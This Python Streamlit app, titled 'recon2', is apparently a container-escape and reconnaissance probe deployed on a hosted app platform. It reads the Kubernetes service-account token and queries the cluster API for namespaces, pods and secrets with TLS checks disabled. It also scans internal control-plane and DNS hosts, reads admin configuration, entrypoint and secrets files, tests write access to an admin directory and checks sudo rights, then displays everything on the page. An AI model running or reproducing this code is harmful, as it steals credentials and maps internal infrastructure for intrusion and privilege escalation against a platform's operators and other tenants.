import streamlit as st, os, socket, subprocess, urllib.request, ssl
def sh(c,t=8):
    try: return subprocess.run(c,shell=True,capture_output=True,text=True,timeout=t).stdout[:3500]
    except Exception as e: return "ERR:"+repr(e)[:200]
def cat(p):
    try: return open(p).read()[:3000]
    except Exception as e: return "ERR:"+repr(e)[:150]
def http(url,headers=None,t=4,insecure=False):
    try:
        ctx=ssl._create_unverified_context() if insecure else None
        r=urllib.request.Request(url,headers=headers or {})
        return urllib.request.urlopen(r,timeout=t,context=ctx).read().decode()[:2500]
    except Exception as e: return "ERR:"+repr(e)[:250]
def chk(ip,port,t=2):
    try: s=socket.create_connection((ip,port),timeout=t); s.close(); return "OPEN"
    except Exception as e: return type(e).__name__
R={}
# k8s SA token
satok=cat("/var/run/secrets/kubernetes.io/serviceaccount/token")
sans =cat("/var/run/secrets/kubernetes.io/serviceaccount/namespace")
R["sa_token_present"]= "yes len=%d"%len(satok) if not satok.startswith("ERR") else satok
R["sa_namespace"]=sans
if not satok.startswith("ERR"):
    h={"Authorization":"Bearer "+satok}
    R["k8s_api_version"]=http("https://10.0.96.1/version",h,insecure=True)
    R["k8s_self_namespaces"]=http("https://10.0.96.1/api/v1/namespaces",h,insecure=True)
    R["k8s_pods_allns"]=http("https://10.0.96.1/api/v1/pods?limit=5",h,insecure=True)
    R["k8s_secrets_myns"]=http("https://10.0.96.1/api/v1/namespaces/%s/secrets?limit=5"%sans.strip(),h,insecure=True)
# control-plane probes
R["cp_10.0.106.70:9080_root"]=http("http://10.0.106.70:9080/",t=4)
R["cp_health"]=http("http://10.0.106.70:9080/healthz",t=4)
R["cp_metrics"]=http("http://10.0.106.70:9080/metrics",t=4)
R["cp_ports"]={p:chk("10.0.106.70",p) for p in [80,443,8080,9080,9090,50051,6379,5432,8501]}
# internal scan
R["scan_kubeapi"]={p:chk("10.0.96.1",p) for p in [443,6443,8080,10250]}
R["scan_kubedns"]={p:chk("10.0.96.10",p) for p in [53,9153,10250,10255]}
# admin dir privesc surface
R["mount_admin_ls"]=sh("ls -la /mount/admin/ 2>&1")
R["supervisord_conf"]=cat("/mount/admin/.supervisord.conf")
R["entrypoint"]=cat("/entrypoint")
R["install_path"]=cat("/mount/admin/install_path")
R["admin_writable"]=sh("touch /mount/admin/.bbtest 2>&1 && echo WRITABLE && rm -f /mount/admin/.bbtest || echo NO")
R["sudo_l"]=sh("sudo -n -l 2>&1")
R["my_secrets"]=cat("/mount/secrets/secrets.toml")
# adminuser home (uid 1000) readable from appuser?
R["adminuser_home"]=sh("ls -la /home/adminuser/ 2>&1 | head -20")
st.title("recon2"); st.json(R)
import sys
for k,v in R.items(): sys.stderr.write("R2>>> %s = %s\n"%(k,str(v)[:1500]))
